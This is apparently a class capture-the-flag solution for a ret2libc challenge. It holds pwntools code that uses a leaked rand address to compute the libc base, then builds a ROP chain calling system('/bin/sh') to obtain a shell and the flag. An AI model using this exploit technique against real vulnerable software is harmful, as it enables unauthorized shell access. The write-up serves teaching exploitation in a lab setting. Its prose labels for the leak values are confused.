# Ret2libc:Solution

The binary is compiled with NX and Partial RELRO
```
 pwn checksec chal.bin                                                      
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)              
[*] '/root/workspace/vuln/ret2libc/chal/chal.bin'                              
    Arch:     amd64-64-little                                                  
    RELRO:    Partial RELRO                                                    
    Stack:    No canary found                                                  
    NX:       NX enabled                                                       
    PIE:      No PIE (0x400000) 
```
    
and is dynamically linked to GLIBC.
```
ldd chal.bin
    linux-vdso.so.1 (0x00007fff24bd2000)
    libc.so.6 => /lib64/libc.so.6 (0x00007f4778600000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f477896e000)
```

We can exploit the read() function.
```
ssize_t vuln()
{
    printf("--------------------------------…");
    printf("Random Value: %p\n", rand);
    printf("--------------------------------…");
    printf("I'm standing on the edge\n");
    printf("Feeling like I'm just a pawn\n");
    printf(" - \x1b[0;31mRand\x1b[0mon - Ima…");
    printf("--------------------------------…");
    void var_10;
    return read(0, &var_10, 0x1337);
 }
 ```
 
The above function gives us the location of a miscalled function rand. This leak allows us to determine the libc version and calculate the libc base address. 

We save the location of rand in the plt that is recieved from the command line. Then we rand in the got which is automatically returned as an int. Using those two values we can calculate the libc base address. 

```
io.recvuntil(b'Random Value: ')
plt_val = int(io.recvline(), 16)
got_val = libc.sym['rand'] # sym can find the value by name in the got, automatically an int
libc_base  = plt_val - got_val
```

Add 16 bytes of padding and align the stack. Find a pop rdi gadget to clear out rdi and add a bin/sh into it. Then call system and send the chain to get a shell.
```
chain = cyclic(16)
chain += p64(libc_base + r.find_gadget(['ret'])[0]) # 8 bytes to align stack
chain += p64(libc_base + r.find_gadget(['pop rdi','ret'])[0]) # returns list of gadgets [0] takes first one
chain += p64(libc_base + next(libc.search(b'/bin/sh\x00')))
chain += p64(libc_base + libc.sym['system'])
io.sendline(chain)
io.interactive()
```

Send the chain and get the flag!
```
flag{1ts_A_RAND0m_w0rlD}
```

Resources:
* Class slides
* Demo solve script
* Louie
* Alex
